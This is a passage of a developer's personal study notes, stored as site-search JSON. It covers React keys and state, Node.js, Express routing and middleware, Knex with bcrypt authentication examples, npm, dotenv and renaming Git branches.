to the elements inside the array to give the elements a stable identity.</p> <pre><code>const numbers = [1, 2, 3, 4, 5];\nconst listItems = numbers.map((number) =&gt;\n&lt;li key={number.toString()}&gt;\n{number}\n&lt;/li&gt;\n);\n</code></pre> </li> <li> <p>Stable Identity: The best way to pick a key is to use a string that uniquely identifies a list item among its siblings. Most often we would use IDs from our data as keys. When that's not the case, we can add a new ID property to our model or hash some parts of the content to generate a key.</p> <p>Note</p> <p>For example: if the user.id or mongo key are completely unique with no specific order to them (or too much of a revealing information about the user's secrets), either is a good choice. Also if it is a string, the comparison will be faster.</p> </li> <li> <p>Keys used within arrays should be unique among their siblings. However they don\u2019t need to be globally unique. We can use the same keys when we produce two different arrays.</p> </li> <li> <p>Keys serve as a hint to React but they don\u2019t get passed to your components.</p> </li> <li> <p>When we don\u2019t have stable IDs for rendered items, we may use the item index as a key as a last resort.</p> <pre><code>const todoItems = todos.map((todo, index) =&gt;\n// Only do this if items have no stable IDs\n&lt;li key={index}&gt;\n{todo.text}\n&lt;/li&gt;\n);\n</code></pre> <p>Note</p> <p>If you choose not to assign an explicit key to list items then React will default to using indexes as keys.</p> <p>Warning</p> <p>It's not recommended using indexes for keys if the order of items may change. This can negatively impact performance (because if we remove an item in the middle of the array, all of the index numbers of the items following it need to be updated which is expensive) and may cause issues with component state. Futher reading: Index as a key is an anti-pattern,  \u0412\u0441\u0435 \u043b\u0438 \u0432\u044b \u0437\u043d\u0430\u0435\u0442\u0435 \u043e React key?, Understanding unique keys for array children in React.js(Stackoverflow).</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#state","title":"State","text":"<p>Reference: State and Lifecycle(from official docs)</p> <ul> <li>A \"state\" is simply an object - an object that describes our application.</li> <li>State can change and affect our app.</li> <li> <p>We can setup state using class-based component.</p> <pre><code>class App extends Component {\nconstructor() {\nsuper();\nthis.state = {\nrobots: [],\nsearchfield: '',\n}\n}\n\ncomponentDidMount() {\nfetch('https://jsonplaceholder.typicode.com/users')\n.then(response =&gt; response.json())\n.then(users =&gt; this.setState({ robots: users }));\n}\n\nonSearchChange = (event) =&gt; {\nthis.setState({searchfield: event.target.value})\n}\n\nrender() {\nconst { robots, searchfield } = this.state;\nconst filteredRobots = robots.filter(robot =&gt; {\nreturn robot.name.toLowerCase().includes(searchfield.toLowerCase());\n});\nreturn !robots.length ?\n&lt;h1 className=\"tc\"&gt;Loading&lt;/h1&gt; :\n(\n&lt;div className=\"tc\"&gt;\n&lt;h1 className=\"f1\"&gt;RoboFriends&lt;/h1&gt;\n&lt;SearchBox searchChange={this.onSearchChange} /&gt;\n&lt;Scroll&gt;\n&lt;ErrorBoundry&gt;\n&lt;CardList robots={filteredRobots} /&gt;\n&lt;/ErrorBoundry&gt;``\n&lt;/Scroll&gt;\n&lt;/div&gt;\n);\n};\n}\n</code></pre> <p>Note</p> <p>Rule of thumb: Any time we create our own methods on a class-based smart component, we use an arrow function. Futher reading: Handling Events.</p> <p>From the code block above:</p> <pre><code>// we write this\n// because this makes sure that the \"this\" value is according to where it was created, which is our smart component\nonSearchChange = (event) =&gt; {\nthis.setState({searchfield: event.target.value})\n}\n\n// instead of this\n// because here the value of \"this\" is the \"input\" from the SearchBox.js component and it doesn't have \"state.robots\"\nonSearchChange (event){\nthis.setState({searchfield: event.target.value})\n}\n</code></pre> <ul> <li> <p>setState()</p> <p>Reference: Understanding React 'setState'</p> <ul> <li> <p>This is the method that comes with React. Any time we want to change state we always do use it and we don't do e.g. <code>this.state.searchfield =</code>.</p> </li> <li> <p>On each state change the virtual DOM(that is just a javascript object) collects this entire state and React uses this state by calling the <code>render()</code> function to render and pass its properties down as props to pure components that are rerendered accordingly to their changed props. Only the component which changes gets rerendered and this is the power of React!</p> </li> <li> <p><code>setState()</code> in React is a async method. This means, that its value is not accessible in a synchronized way. React will batch multiple calls to <code>setState()</code> into a single call, and then re-render the component a single time, rather than re-rendering for every state change. So geting the state right after we setState might get the old state. Further reading: React Docs.</p> <p>Solution: use <code>componentDidUpdate</code> or a setState callback: <code>setState(updater, callback)</code></p> <p>For example if we want to console.log the actual value of our state, we have to use the callback: <code>this.setState({property: value}, () =&gt; console.log(this.state.property)</code>,e.g.:</p> <pre><code>this.setState({robots: users}, () =&gt; {\nconsole.log('state.robots inside from setState', this.state.robots);\n})\n</code></pre> </li> <li> <p>Setitng initial state:</p> <pre><code>    const initialState = {\ninput: '',\nimageUrl: '',\nbox: {},\nroute: 'signin',\nisSignedIn: false,\nuser: {\nid: '',\nname: '',\nentries: 0,\njoined: '',\n}\n}\n\nclass App extends React.Component {\nconstructor() {\nsuper();\nthis.state = initialState;\n}\n.\n.\n.\n}\n</code></pre> <p>When we use <code>setState</code>, we actually do not work with the same <code>initialState</code> object anymore. <code>setState</code> makes a copy of the <code>state</code> object first and makes the changes to the copy instead. This means, technically we don't access the <code>iniitalState</code> object anymore at this point.</p> <p>Although <code>this.state</code> is referencing the <code>initalState</code> object at first, after <code>setState</code> was called this is not the case anymore.</p> </li> </ul> </li> </ul> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#lifecycle-update-needed","title":"Lifecycle (update needed...)","text":"<p>Lifecycle Hooks(from official docs)</p> <p>mounting: start the web page by checking <code>constructor()</code>, <code>componentWillMount()</code>, <code>render(),</code> <code>componentDidMount()</code>, these functions are pre-built by react, and are called without parameters</p> <p>updating: touch the web, it rerender component when receive new input</p> <p>unmounting: when a component is removed from a page, like when we change to different page</p>"},{"location":"Dev/Prg/LibsFwks/React/#error-boundary","title":"Error Boundary (\u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043e\u0448\u0438\u0431\u043e\u043a)","text":"<p>Wrap a component, if any error take place in children, it will catch it and show something instead to the user in the production.</p> <pre><code>import React, { Component } from 'react';\n\nclass ErrorBoundry extends Component {\nconstructor(props) {\nsuper(props);\nthis.state = {\nhasError: false\n}\n}\n\ncomponentDidCatch(error, info) {\nthis.setState({ hasError: true })\n}\n\nrender() {\nif (this.state.hasError) {\nreturn &lt;h1&gt;Oooops. That is not good&lt;/h1&gt;\n}\nreturn this.props.children\n}\n}\n\nexport default ErrorBoundry;\n</code></pre>"},{"location":"Dev/Prg/LibsFwks/React/#hooks","title":"Hooks","text":"<ul> <li>Robofirends application using hooks</li> </ul>"},{"location":"Dev/Prg/LibsFwks/React/#tips-tricks","title":"Tips &amp; Tricks","text":""},{"location":"Dev/Prg/LibsFwks/React/#a-common-way-to-work-with-forms-in-react","title":"A common way to work with forms in React","text":"<p>One state property takes care of the user input and the another state object takes care of passing it as a prop. Further reading about how forms are handled in React: React Docs.</p> <p>For example in face-recongition-brain app the <code>input</code> state takes care of storing the user input and the <code>imageUrl</code> state is the state which we pass as prop into the face recognition component.</p>"},{"location":"Dev/Prg/LibsFwks/React/#50-job-interview-questionsrus","title":"50 Job Interview Questions(Rus)","text":"<p>YouTube:</p> <p></p> <p>Offline:</p> <p></p>"},{"location":"Dev/Prg/LibsFwks/Redux/","title":"Redux","text":""},{"location":"Dev/Prg/LibsFwks/Redux/#react-essentials","title":"React Essentials","text":"<p>Reference:</p> <ul> <li> <p>Official website</p> </li> <li> <p>React/Redux Links </p> </li> <li> <p>Redux docs in Russian(old docs)</p> </li> </ul>"},{"location":"Dev/Prg/LibsFwks/Redux/#definition","title":"Definition","text":"<ul> <li>Redux - is a global state management library.</li> </ul>"},{"location":"Dev/Prg/LibsFwks/Redux/#thunk","title":"Thunk","text":"<ul> <li>Redux Docs - Writing Logic with Thunks</li> <li>What the heck is a 'thunk'?</li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/","title":"NodeJs","text":"<p>Reference:</p> <p>Official Docs</p> <p>Node JS Cheat Sheet(by ZTM)</p> <p></p> <p>\u0420\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u043e \u043f\u043e Node.js:</p> <p></p> <p>Installation:</p> <p>Official website</p>"},{"location":"Dev/Prg/Runtime/NodeJs/#nodejs-essentials","title":"NodeJs Essentials","text":""},{"location":"Dev/Prg/Runtime/NodeJs/#nodejs-basics","title":"NodeJs Basics","text":"<p>NodeJs allows computer to run JavaScript in a server, which is outside of the browser(it has a javascript engine V8).</p> <ul> <li>enter node mode in terminal: <code>node</code>;</li> <li>check function in node: <code>global.functionName</code>, e.g.: <code>global.setTimeout</code>;</li> <li>exit node: <code>process.exit()</code>;</li> <li>run script in node: <code>node script.js</code>;</li> <li>get directory name: <code>__dirname</code></li> <li> <p>import/export modules</p> <ol> <li> <p>using the CommonJS old way:</p> <ol> <li> <p>created by ourselves modules</p> <ul> <li> <p>export variable:<code>module.exports = {property: value}</code>, e.g. in script2.js file: <code>module.exports = {largeNumber: largeNumber}</code></p> <p><code>module</code> is a global object that we have access to(<code>global.module</code>). It has <code>exports</code> empty object property:</p> <pre><code>Module {\n  id: '&lt;repl&gt;',\n  path: '.',\n  exports: {},\n  filename: null,\n  loaded: false,\n  children: [],\n  paths: [\n    .\n    .\n    .\n  ]\n}\n</code></pre> <p>We can add to this object any entities we want like variables, functions, objects etc. so they become availabe through this object in the file where this object imported(as a global object) to.</p> </li> <li> <p>import variable: <code>require()</code>, e.g. in script.js file: <code>const script2 =  require('./script2')</code> and <code>const script2</code> here is the name(which can be whatever we want) of the imported global object <code>require('./script2)</code></p> </li> <li>use imported variable: <code>importName.variableName</code>, e.g. in script.js file: <code>const a = script2.largeNumber</code></li> </ul> </li> <li> <p>built-in modules</p> <ul> <li>import only: <code>require('moduleName')</code></li> </ul> </li> <li> <p>npm modules</p> <ul> <li> <p>import only: like built-in modules or by setting configuration in package.json file, e.g.:</p> <pre><code>\"scripts\": {\n\"start\": \"nodemon server.js\"\n}\n</code></pre> </li> </ul> </li> </ol> </li> <li> <p>using ES6 new way:</p> <p>in order to be able to use this way we need either change the extension of each .js file to .mjs or insert <code>\"type\": \"module\"</code> line into the package.json file</p> </li> </ol> </li> <li> <p><code>JSON.stringify()</code> converts JavaScript objects into strings. When sending data to a web server the data has to be a string.</p> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#nodejs-built-in-modules","title":"NodeJs built-in modules","text":"<p>These modules come already pre-installed with Node.</p>"},{"location":"Dev/Prg/Runtime/NodeJs/#file-system-module","title":"File System module","text":"<p>Allows operations with a file.</p> <p><code>require('fs')</code></p> <ul> <li> <p>read file content</p> <p><code>fs.readFile/readFileSync('filePath', (err, data) =&gt; {...})</code></p> <pre><code>const fs = require('fs');\n\n// async with call back function: read code line by line and after finish reading file content, will callback to pass the data to the function\nfs.readFile('./hello.txt',(err,data)=&gt;{\nif (err) { console.log('err!!')}\nconsole.log('1',data.toString()) // need to have encoding by toString('ENCODING'), default ENCODING is 'utf8' wich cover many languages\n})\n\n// sync, only read the next line if this line finished, so for large file, the program need to wait long time until it finish to continue\nconst file = fs.readFileSync('./hello.txt')\nconsole.log('2',file.toString())\n\n// output 2 1\n</code></pre> </li> <li> <p>add text to the file(create a file in advance if it did not exist)</p> <p><code>fs.appendFile('filePath', 'Content', err =&gt;{...})</code></p> </li> <li> <p>create text file and write to it</p> <p><code>fs.writeFile('filePath', 'Content', err =&gt; {...})</code></p> </li> <li> <p>delete file</p> <p><code>fs.unlink('filePath', err =&gt; {...})</code></p> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#http-module","title":"Http module","text":"<p>Allows build a server.</p> <p><code>require('http')</code></p> <p>Simple example of building a server written inside server.js file:</p> <pre><code>const http = require('http');\n\nconst server = http.createServer((request, response) =&gt; {\nconsole.log('headers', request.headers);\nconsole.log('method', request.method);\nconsole.log('url', request.url);\nconst user = {\nname: 'John',\nhobby: 'Skating',\n}\nresponse.setHeader('Content-Type', 'application/json');\nresponse.end(JSON.stringify(user));\n})\n\nserver.listen(3000);\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#nodejs-useful-npm-modules","title":"NodeJs useful npm modules","text":""},{"location":"Dev/Prg/Runtime/NodeJs/#nodemon-module","title":"Nodemon module","text":"<p>Allows changing in js file reflect in terminal instantly.</p> <p><code>npm install nodemon --save-dev</code> or <code>npm install -D nodemon</code></p> <pre><code>\"scripts\": {\n\"start\": \"nodemon server.js\"\n}\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#expressjs-library","title":"Express.js library","text":"<p>Reference:</p> <p>Official Website</p> <p></p> <p>Installation:</p> <p><code>npm install express</code></p>"},{"location":"Dev/Prg/Runtime/NodeJs/#expressjs-essentials","title":"Express.js Essentials","text":""},{"location":"Dev/Prg/Runtime/NodeJs/#expressjs-basics","title":"Express.js Basics","text":"<p>A node.js library to help build a server.</p> <p><code>npm install express</code></p> <p>Define server using just this 3 lines of code:</p> <pre><code>const express = require('express');\nconst app = express();\n.\n.\n.\napp.listen(3000); // port\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#expressjs-routing-and-restful-api","title":"Express.js routing and RESTful API","text":"<p>Routing:</p> <p>Express relies on routing to determine how an application responds to a client request to a particular endpoint, which is a Uniform Resource Identifier (or path) and a specific HTTP request method (e.g., GET, POST, etc.).  Each route can have one or more handler functions, which are executed when the route is matched.</p> <p>Routes follow the syntax below:</p> <p>app.METHOD(PATH, HANDLER) e.g. <code>app.get('/', (req, res) =&gt; {...})</code></p> <ul> <li>app(<code>app</code>) is an instance of Express</li> <li> <p>METHOD(<code>.get</code>) is an HTTP request method(GET, POST, PUT, DELETE etc.), in lowercase</p> <p>Note</p> <ol> <li>Everything entered into the adressbar will always be a GET request.</li> <li>POST method can be used with a <code>fetch()</code> call or within a html form by defining <code>method=\"post\"</code>.</li> <li>All other methods can be accessed programmatically only. GET and POST can be accessed programmatically too.</li> <li>Programmatically means using terminal or e.g. using Postman - a tool for API Development and testing server before connecting to front-end.</li> </ol> </li> <li> <p>PATH(<code>'/'</code>) is a path on the server</p> </li> <li>HANDLER(<code>(req, res) =&gt; {...}</code>) is the function executed when the route is matched<ul> <li><code>req</code> (Request) and <code>res</code> (Response) are actually objects (and can be named whatever we want, although req and res are conventions).</li> <li>\"Request\" is an object containing all the information about the request that was made and which triggered the route.</li> <li>\"Response\" is an object containing all of the data that the server is going to respond with.</li> </ul> </li> </ul> <p>RESTful API:</p> <ul> <li> <p>An API that defines a set of functions which developers can perform: requests and receive responses via a HTTP protocol using methods such as GET, POST, PUT, DELETE and it uses these methods as follows:</p> <ul> <li>GET to receive a resource</li> <li>POST to create a resource</li> <li>PUT to change the state or update a resource</li> <li>DELETE to remove a resource</li> </ul> </li> <li> <p>REST APis are stateless - meaning that calls can be made independently of one another and each call contains all the data necessary to complete itself successfully. A server doesn't need to keep memorizing things, i.e. each request that comes in has enough information that the server can respond with, so each request sent to a server is a independent property of the \"Request\" object.</p> </li> <li> <p>The most used properties of Request object:</p> <ul> <li> <p><code>req.query</code></p> <p>use in GET request, e.g. <code>localhost:3000/?name=andrei&amp;age=31</code>. ? is for query</p> </li> <li> <p><code>req.body</code></p> <p>use in POST request with middleware(like bodyparser or new express.js methods passed through the genereic app.use() middleware) to receive data(urlencoded or json) sent in request body, e.g <code>req.body.email</code></p> </li> <li> <p><code>req.headers</code></p> <p>use in GET request to get all headers and the input</p> </li> <li> <p><code>req.params</code></p> <p>use in GET request to get the parameters in the url(e.g. localhost:8000/12345), e.g. <code>app.get('/:id',(req,res)=&gt;{const {id} = req.params})</code>, <code>app.get('/:id',(req,res) =&gt; console.log(req.params)</code></p> </li> </ul> </li> <li> <p>The most used properties of Response object:</p> <ul> <li> <p><code>res.send()</code>, e.g. <code>app.get('/',(req,res) =&gt; res.send('getting root')</code></p> </li> <li> <p><code>res.status()</code>, e.g. <code>res.status(404).send('not found')</code> to set the response status of the request</p> </li> </ul> </li> <li> <p>RESTful routing can be described as an architectural style(an approach to communications)  that provides a map between HTTP verbs (e.g., GET, POST, etc.) and CRUD (create, read, update, delete) actions.  There are seven RESTful route conventions:</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#expressjs-middleware","title":"Express.js Middleware","text":"<p>Note</p> <p>Middleware is a type of computer software that provides services to software applications beyond those available from the operating system. It can be described as \"software glue\"(Wikipedia).</p> <ul> <li> <p><code>app.use()</code> - generic Express middleware(\u0443\u043d\u0438\u0432\u0435\u0440\u0441\u0430\u043b\u044c\u043d\u043e\u0435 \u043f\u0440\u043e\u043c\u0435\u0436\u0443\u0442\u043e\u0447\u043d\u043e\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u043d\u043e\u0435 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0435\u043d\u0438\u0435). It receives ahead of time before we get to the routes, the request, modifies it and then passes the <code>next()</code> callback function to keep it going and \"trickle down\" the modifiyed request to apt.get/post/put/delete etc.</p> <pre><code>app.use((req,res,next) =&gt; {\nconsole.log()\nnext(); // allow express to run after this\n})\n</code></pre> </li> <li> <p>In order to get <code>req.body</code>(the body of our request, e.g. form data that user submitted through the <code>&lt;form&gt;&lt;/from&gt;</code> tag using POST method OR raw JSON data that was sent in the request body) we can use the body-parser(npm) middleware(the old way) or the express built-in methods(the new way):</p> <pre><code>// the old way\nconst bodyParser = require('body-parser');\n\napp.use(bodyParser.urlencoded({extended: false})); // to get the form input\napp.use(bodyParser.json());  // to get JSON data sent in the request body\n\n// the new way\napp.use(express.urlencoded({extended: false})); // to get the form input\napp.use(express.json());  // to get JSON data sent in the request body\n</code></pre> <p>Note</p> <p>The above middleware packages, already implement the <code>next()</code> within them. We only add the <code>next()</code> when we implement our own middleware.</p> </li> <li> <p>To serve static assets, i.e. index.html, css file and js file we put'em in the public folder within our project folder and get Express to send these file using its following middleware: <code>app.user(express.static(__dirname + '/public'))</code></p> <p>So the server(server.js file) that serves simple static assets will look like this:</p> <pre><code>const express = require('express');\nconst app = express();\n\napp.use(express.static(__dirname + '/public'))\n\napp.listen(3000);\n</code></pre> </li> <li> <p>CORS(mdn) - to allow cross-origin request we use following npm package: <code>npm install cors</code> by calling it through generic Express.js middleware, e.g.:</p> <pre><code>const express = require('express');\nconst app = express();\n\napp.user(cors())\n\napp.listen(3000);\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#connect-frontend-to-backend","title":"Connect frontend to backend","text":"<pre><code>// code from Signin.js react component of face-recognition-brain app\nonSubmitSignIn = () =&gt; {\nfetch('http://localhost:3000/signin', {\nmethod: 'post',\nheaders: { 'Content-Type': 'application/json' },\nbody: JSON.stringify({\nemail: this.state.signInEmail,\npassword: this.state.signInPassword,\n})\n})\n// get the response from server: res.json()\n.then(response =&gt; response.json())\n.then(user =&gt; {\nif (user.id) { // does the user exist? Did we receive a user with a property of id?\nthis.props.loadUser(user);\nthis.props.onRouteChange('home');\n}\n})\n}\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#knexjs-library","title":"Knex.js library","text":"<p>SQL query builder library for Postgres, MSSQL, MySQL, MariaDB, SQLite3, Oracle, and Amazon Redshift.</p> <p>Reference:</p> <p>Official Website</p> <p>Installation:</p> <ol> <li>instal postgreSQL database package: <code>npm install pg</code></li> <li>install knex: <code>npm i knex</code></li> </ol> <p>Connect server to database(code from server.js file):</p> <pre><code>const db = knex({\nclient: 'pg',\nconnection: {\nhost: '127.0.0.1',\nuser: 'tms',\npassword: '',\ndatabase: 'smart-brain'\n}\n});\n\n// signin by checking password match in login table and return user info in users table\napp.post('/signin', (req, res) =&gt; {\ndb.select('email', 'hash').from('login')\n.where('email', '=', req.body.email)\n.then(data =&gt; {\nconst isValid = bcrypt.compareSync(req.body.password, data[0].hash)\nif (isValid) {\nreturn db.select('*').from('users')\n.where('email', '=', req.body.email)\n.then(user =&gt; {\nres.json(user[0])\n})\n} else {\nres.status(400).json('wrong credentials')\n}\n})\n.catch(err =&gt; res.status(400).json('unable to get user'))\n})\n\n// transaction + insert into two tables with foreign key\napp.post('/register', (req, res) =&gt; {\nconst { email, name, password } = req.body\nconst hash = bcrypt.hashSync(password, 10)\ndb.transaction(trx =&gt; {  // we create a transaction when we have to do more than two things at once and thus we use transaction object 'trx' instead of 'db'\ntrx.insert({\nhash: hash,\nemail: email,\n})\n.into('login')\n.returning('email')\n.then(loginEmail =&gt; {\nreturn trx('users')\n.returning('*')\n.insert({\nemail: loginEmail[0],\nname: name,\njoined: new (Date),\n})\n.then(user =&gt; {\nres.json(user[0]);  // knex returns us an array of inserted to db rows, so we use here 'user[0]' and it only means, that we don't want to get it as an array, we want the response to be the object only instead\n})\n})\n.then(trx.commit)\n.catch(trx.rollback)\n})\n.catch(err =&gt; res.status(400).json('unable to register'))\n})\n\n// get data\napp.get('/profile/:id', (req, res) =&gt; {\nconst { id } = req.params;\ndb.select('*').from('users').where({id}) // {id} - here we use ES6 object property declaration shortcut\n.then(user =&gt; {\nif (user.length) {\nres.json(user[0])\n} else {\nres.status(400).json('Not found')\n}\n})\n.catch(err =&gt; res.status(404).json('error getting user'))\n})\n\n// update/increment\napp.put('/image', (req, res) =&gt; {\nconst { id } = req.body;\ndb('users').where('id', '=', id)\n.increment('entries', 1)\n.returning('entries')\n.then(entries =&gt; {\nres.json(entries[0]);\n})\n.catch(err =&gt; res.status(400).json('unable to get entries'))\n})\n****\napp.listen(3000, () =&gt; {\nconsole.log('app is running on port 3000...');\n})\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#npm-node-package-manager","title":"NPM (Node Package Manager)","text":"<p>Reference:</p> <p>Official website</p> <p>Installation:</p> <p>NPM is installed with Node.js</p> <p>Upgrading(according to official docs):</p> <ul> <li> <p>to the latest version: <code>npm install -g npm@latest</code></p> </li> <li> <p>to the most recent version: <code>npm install -g npm@next</code></p> <p>Note</p> <p>You may need to prefix these commands with <code>sudo</code>, especially on Linux, or OS X if you installed Node using its default installer.</p> </li> </ul> <p>Common commands:</p> <ul> <li><code>npm init</code> create package.json file in your repo</li> <li><code>npm install packageName</code> only install in a project</li> <li><code>npm install -g packageName</code> will install globally, which can use in terminal</li> <li><code>npm run built</code> create a optimized js file that can put on the internet</li> <li><code>--save-dev</code> means the dependencies only use in development by you</li> <li>run command in <code>scripts:{}</code> will look for file in <code>.bin</code></li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#npm-essentials","title":"Npm Essentials","text":""},{"location":"Dev/Prg/Runtime/NodeJs/#dependencies-packagejson-file","title":"Dependencies: package.json file","text":"<ul> <li> <p>Created after runnung <code>npm init</code>. Gets populated with git repo info, scripts and dependecies(locally installed NPM packages for our project)</p> <p>Note</p> <p>Dependencies: a new person can install all dependencies when start the  project by <code>npm install</code></p> </li> <li> <p>Script: run commands in a script by <code>npm run scriptName</code> e.g.:</p> <pre><code>// first define new script in package.json file like this:\n\"script\":{\n\"build\":\"browserify script.js &gt; bundle.js &amp;&amp; live-server\"\n}\n</code></pre> <pre><code># then run it in terminal:\nnpm run build\n</code></pre> </li> <li> <p>Check the version of packages you need to update to: NPM Semver</p> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#useful-npm-packages","title":"Useful Npm packages","text":""},{"location":"Dev/Prg/Runtime/NodeJs/#lodash","title":"Lodash","text":"<p>Official website, NPM</p> <p><code>npm install lodash</code></p>"},{"location":"Dev/Prg/Runtime/NodeJs/#live-server","title":"Live-server","text":"<p>NPM</p> <p><code>npm install -g live-server</code></p>"},{"location":"Dev/Prg/Runtime/NodeJs/#browserify-outdated-used-for-old-browsers-that-doesnt-support-es6-modules","title":"Browserify outdated - used for old browsers that doesn't support ES6 Modules","text":"<p>NPM</p> <p><code>npm install -g browserify</code></p> <pre><code>// browserify syntax\nvar _ = require('lodash')\nconst array = [1,2,3]\nconsole.log('answer',_.without(array,3)) //without is a function in lodash\n</code></pre> <pre><code># use broswerify to combine js files in terminal\nbrowserify script.js &gt; bundle.js\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#bcrypt","title":"Bcrypt","text":"<p>NPM</p> <p><code>npm install bcrypt</code></p> <p>To securily store sensitive data like passwords we store it in hashes:</p> <pre><code>/*\n* You can copy and run the code below to play around with bcrypt\n* However this is for demonstration purposes only. Use these concepts\n* to adapt to your own project needs.\n*/\n\nimport bcrypt from 'bcrypt'\nconst saltRounds = 10 // increase this if you want more iterations\nconst userPassword = 'supersecretpassword'\nconst randomPassword = 'fakepassword'\n\nconst storeUserPassword = (password, salt) =&gt;\nbcrypt.hash(password, salt).then(storeHashInDatabase)\n\nconst storeHashInDatabase = (hash) =&gt; {\n// Store the hash in your password DB\nreturn hash // For now we are returning the hash for testing at the bottom\n}\n\n// Returns true if user password is correct, returns false otherwise\nconst checkUserPassword = (enteredPassword, storedPasswordHash) =&gt;\nbcrypt.compare(enteredPassword, storedPasswordHash)\n\n\n// This is for demonstration purposes only.\nstoreUserPassword(userPassword, saltRounds)\n.then(hash =&gt;\n// change param userPassword to randomPassword to get false\ncheckUserPassword(userPassword, hash)\n)\n.then(console.log)\n.catch(console.error)\n</code></pre> <p>Note</p> <p>United States National Institute for Standards and Technology (NIST) recommendations for password management:</p> <ul> <li>Password length: 8-64 characters</li> <li>Do accept both ASCII and UNICODE characters and encourage people to set long passwords with high entropy (upper case letters, lower case letters, digits, special characters).</li> <li>Don\u2019t allow password hints.</li> <li>Avoid security questions.</li> <li>Use 2FA (2 factor authentication) if you want an extra layer of security in your application, but avoid using SMS as this can be easily hacked to have the attackers phone receive the confirmation code.</li> <li>Once the user has registered, there are two things to keep in mind:<ol> <li>Don\u2019t let the user know the password was incorrect when logging in. Instead, mention that the username and password combination is incorrect.</li> <li>The only time passwords should be reset by an administrator is when they suspect that an account has been compromised. Otherwise, passwords should only be reset by a user when he or she has forgotten their credentials.</li> </ol> </li> </ul>"},{"location":"Dev/Prg/Runtime/NodeJs/#dotenv","title":"Dotenv","text":"<p>NPM</p> <p><code>npm i dotenv</code></p> <p>As early as possible in your application, require and configure dotenv.</p> <pre><code>require('dotenv').config()\n</code></pre> <p>Create a <code>.env</code> file in the root directory of your project. Add environment-specific variables on new lines in the form of NAME=VALUE. For example:</p> <pre><code>PORT=3050\n\nDB_HOST=localhost\nDB_USER=root\nDB_PASS=s1mpl3\n</code></pre> <p><code>process.env</code> now has the keys and values you defined in your <code>.env</code> file.</p> <pre><code>const PORT = process.env.PORT || 3000\napp.listen(PORT, () =&gt; {\nconsole.log(`app is running on port ${PORT}...`);\n})\n\nconst db = require('db')\ndb.connect({\nhost: process.env.DB_HOST,\nusername: process.env.DB_USER,\npassword: process.env.DB_PASS\n})\n</code></pre>"},{"location":"Dev/Prg/Runtime/NodeJs/#serve","title":"Serve","text":"<p>NPM</p> <p><code>npm i serve</code></p> <p>Used to serve a static site, single page application or just a static file (no matter if on your device or on the local network).</p> <p>In particular to serve a react spa pass this script into package.json <code>\"scripts\": { \"start\": \"serve -s build\" }</code>. This is the preffered way of deployment according to CRA(Create React App) documentation.</p>"},{"location":"Dev/Prg/Runtime/NodeJs/#npx-execute-npm-package-binaries","title":"NPX (Execute NPM Package Binaries)","text":"<p>NPX it's a package runner tool that comes with npm 5.2+</p> <p>Refernce:</p> <p>Medium</p> <p>Installation:</p> <p>NPX is installed with Node.js</p>"},{"location":"Dev/Prg/Runtime/NodeJs/#nvm-node-version-manager","title":"NVM (Node Version Manager)","text":"<p>Allows to install multiple versions of NodeJs and change between them.</p> <p>Official GitHub, Unofficial tutorial</p>"},{"location":"Dev/Prg/VCS/Git/","title":"Git","text":"<p>OhMyGit game</p> <p>Ignoring Files and Directories in Git (.gitignore)</p> <p>gitignore.io - Create useful .gitignore files for your project: Site, Documentation</p>"},{"location":"Dev/Prg/VCS/Git/#git-essentials","title":"Git Essentials","text":"<p>Offline:</p> <p></p>"},{"location":"Dev/Prg/VCS/Git/#useful-git-guides","title":"Useful Git Guides","text":""},{"location":"Dev/Prg/VCS/Git/#setting-the-default-branch-name","title":"Setting the default branch name","text":"<pre><code>git config --global init.defaultBranch main\n</code></pre> <p>You only have to do this once. Now all new repositories you create with <code>git init</code> will have a default branch named <code>main</code>.</p>"},{"location":"Dev/Prg/VCS/Git/#renaming-the-default-branch-for-an-existing-repositorysource","title":"Renaming the default branch for an existing repository(source)","text":"<ol> <li> <p>Rename the local <code>master</code> branch to <code>main</code>, i.e. use the <code>--move</code> command in Git to copy the entire <code>master</code> branch to a new branch called <code>main</code></p> <pre><code>git branch -m master main\n</code></pre> </li> <li> <p>Check that the renaming worked</p> <pre><code>git status\n</code></pre> <p>If the renaming was successful you should see:</p> <pre><code>On branch main\nYour branch is up to date with 'origin/master'.\n\nnothing to commit, working tree clean\n</code></pre> </li> <li> <p>Rename the default branch for the remote repos</p> </li> </ol> <p>GitHub:</p> <p>GitHub now allows you to rename any branch, including the default branch, from the web.</p> <ol> <li> <p>Rename the default branch from the web:</p> <p></p> </li> <li> <p>Update your local clone:</p> <pre><code># Get the latest commits and branches from the remote\ngit fetch origin\n\n# Create a new tracking connection with the new origin/main branch\ngit branch -u origin/main main\ngit remote set-head origin -a\n</code></pre> </li> </ol> <p>GitLab:</p> <ol> <li> <p>Locally: push <code>main</code> to your remote repository:</p> <pre><code>git push -u origin main\n</code></pre> <p>You will then see an option to start a merge request which we are not going to do because we want <code>main</code> to become the default branch, not <code>master</code>.</p> </li> <li> <p>Change it on GitLab on your project:</p> <ol> <li>Go to Admin Area --&gt; Settings --&gt; Repository.</li> <li>Expand Default initial branch name.</li> <li>Change the default to main.</li> <li>Save changes.</li> </ol> <p>The next time someone clones your repository, they will automatically be on the <code>main</code> branch. When they make changes, the link to create a merge request will automatically be pointed at the <code>main</code> branch.</p> </li> <li> <p>Remove the master branch:</p> <p>You can remove the <code>master</code> branch completely. Removing the <code>master</code> branch is recommended to avoid any confusion around what branch is the default one. If you choose to remove the <code>master</code> branch make sure you update any 